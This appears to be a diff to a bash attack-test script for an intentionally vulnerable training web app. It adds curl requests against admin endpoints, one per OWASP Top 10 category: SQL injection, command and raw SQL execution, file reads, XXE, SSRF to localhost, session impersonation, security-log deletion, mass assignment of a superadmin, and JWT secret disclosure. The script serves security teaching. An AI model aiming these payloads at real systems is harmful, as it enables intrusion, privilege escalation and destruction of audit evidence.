@@ -116,6 +116,62 @@ run_test "Submit Review with XSS Payload" \
 run_test "Verify XSS Payload is Stored" \
     "curl -s -X GET '$API_BASE_URL/api/products/1' | jq '.reviews[] | select(.comment | contains(\"<script>\"))'"
 
+# 7. NEW: Admin Settings OWASP Top 10 Vulnerabilities
+print_header "Testing NEW Admin Settings - OWASP Top 10"
+
+if [ ! -z "$ADMIN_TOKEN" ]; then
+    echo "Using admin token for admin settings tests..."
+    
+    run_test "A01 - Broken Access Control (Execute Admin Command)" \
+        "curl -s -X POST -H \"Authorization: Bearer $ADMIN_TOKEN\" -H 'Content-Type: application/json' -d '{\"command\":\"restart-server\"}' '$API_BASE_URL/api/admin/execute-command' | jq"
+    
+    run_test "A02 - Cryptographic Failures (Weak MD5 Hash)" \
+        "curl -s -X POST -H \"Authorization: Bearer $ADMIN_TOKEN\" -H 'Content-Type: application/json' -d '{\"password\":\"supersecret\",\"method\":\"md5\"}' '$API_BASE_URL/api/admin/generate-hash' | jq"
+    
+    run_test "A03 - SQL Injection (Admin User Search)" \
+        "curl -s -X GET -H \"Authorization: Bearer $ADMIN_TOKEN\" '$API_BASE_URL/api/admin/search-users?query=' OR '1'='1' | jq '.users | length'"
+    
+    run_test "A04 - Insecure Design (Direct SQL Execution)" \
+        "curl -s -X POST -H \"Authorization: Bearer $ADMIN_TOKEN\" -H 'Content-Type: application/json' -d '{\"sql\":\"SELECT COUNT(*) as total FROM users\"}' '$API_BASE_URL/api/admin/execute-sql' | jq"
+    
+    run_test "A05 - Security Misconfiguration (Path Traversal)" \
+        "curl -s -X GET -H \"Authorization: Bearer $ADMIN_TOKEN\" '$API_BASE_URL/api/admin/read-file?path=package.json' | jq '.content | length'"
+    
+    run_test "A06 - Vulnerable Components (XXE)" \
+        "curl -s -X POST -H \"Authorization: Bearer $ADMIN_TOKEN\" -H 'Content-Type: application/json' -d '{\"xml\":\"<settings><theme>dark</theme></settings>\",\"enableExternalEntities\":true}' '$API_BASE_URL/api/admin/process-xml' | jq"
+    
+    run_test "A07 - Authentication Failures (Session Hijacking)" \
+        "curl -s -X POST -H \"Authorization: Bearer $ADMIN_TOKEN\" -H 'Content-Type: application/json' -d '{\"sessionId\":\"sess_123\"}' '$API_BASE_URL/api/admin/impersonate' | jq"
+    
+    run_test "A08 - Software Integrity Failures (Unsafe Deserialization)" \
+        "curl -s -X POST -H \"Authorization: Bearer $ADMIN_TOKEN\" -H 'Content-Type: application/json' -d '{\"serializedData\":\"{\\\"theme\\\":\\\"dark\\\"}\",\"unsafe\":true}' '$API_BASE_URL/api/admin/load-preferences' | jq"
+    
+    run_test "A09 - Logging Failures (Clear Security Logs)" \
+        "curl -s -X DELETE -H \"Authorization: Bearer $ADMIN_TOKEN\" '$API_BASE_URL/api/admin/security-logs' | jq"
+    
+    run_test "A10 - SSRF (Process Internal URL)" \
+        "curl -s -X POST -H \"Authorization: Bearer $ADMIN_TOKEN\" -H 'Content-Type: application/json' -d '{\"url\":\"http://localhost:22\"}' '$API_BASE_URL/api/admin/process-redirect' | jq"
+    
+    run_test "Mass Assignment (Create Super Admin User)" \
+        "curl -s -X POST -H \"Authorization: Bearer $ADMIN_TOKEN\" -H 'Content-Type: application/json' -d '{\"username\":\"superuser\",\"email\":\"super@evil.com\",\"role\":\"superadmin\"}' '$API_BASE_URL/api/admin/create-user' | jq"
+    
+    run_test "Information Disclosure (Admin Settings)" \
+        "curl -s -X GET -H \"Authorization: Bearer $ADMIN_TOKEN\" '$API_BASE_URL/api/admin/settings' | jq '.security.jwtSecret'"
+else
+    echo "⚠️  Admin token not available - skipping admin settings tests"
+    echo "   Try running the mass assignment test first to create an admin user"
+fi
+
 echo -e "\n\n=================================================="
-echo -e "  All non-destructive attacks completed."
-echo -e "==================================================\n" 
+echo -e "  All attacks completed (including OWASP Top 10)!"
+echo -e "=================================================="
+echo -e "\n🎓 Educational Summary:"
+echo -e "  ✅ Information Disclosure Vulnerabilities"
+echo -e "  ✅ SQL Injection Attacks"
+echo -e "  ✅ Path Traversal Attacks"
+echo -e "  ✅ Authentication Bypass"
+echo -e "  ✅ Authorization Flaws"
+echo -e "  ✅ Mass Assignment"
+echo -e "  ✅ XSS Vulnerabilities"
+echo -e "  ✅ ALL OWASP Top 10 (2021) in Admin Settings"
+echo -e "\n⚠️  Remember: This is for educational purposes only!" 
